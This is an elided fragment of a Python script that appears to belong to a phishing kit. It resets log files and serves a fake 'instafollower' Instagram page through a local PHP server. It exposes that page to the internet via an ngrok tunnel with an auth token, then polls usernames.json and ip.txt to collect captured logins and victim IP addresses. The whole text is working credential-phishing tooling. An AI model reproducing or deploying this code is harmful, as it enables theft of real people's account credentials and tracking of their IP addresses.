...
a = open("../Fake-page/site/instafollower/usernames.json","w")
b = a.write("")
a.close

i = open("../Fake-page/site/instafollower/ip.txt","w")
o = i.write("")
i.close
    ...
    if os.name == "nt":
        ...
        def server():
            with open("server.log","w") as phplog:
                Popen(("php","-S","localhost:1010","-t","../Fake-page/site/instafollower"),stdout=phplog,stderr=phplog)
        
        server()
        link = ngrok.connect(1010,"http",auth_token=token)
        ...
        def user():
            global sf
            if not str(os.stat("../Fake-page/site/instafollower/usernames.json").st_size) == sf:
                sf = str(os.stat("../Fake-page/site/instafollower/usernames.json").st_size)
                file = open("../Fake-page/site/instafollower/usernames.json","r")
                rfile = file.read()
                try:
        ...
        def ip():
            global sf
            if not str(os.stat("../Fake-page/site/instafollower/ip.txt").st_size) == sf:
                sf = str(os.stat("../Fake-page/site/instafollower/ip.txt").st_size)
                ipfile= open("../Fake-page/site/instafollower/ip.txt","r")
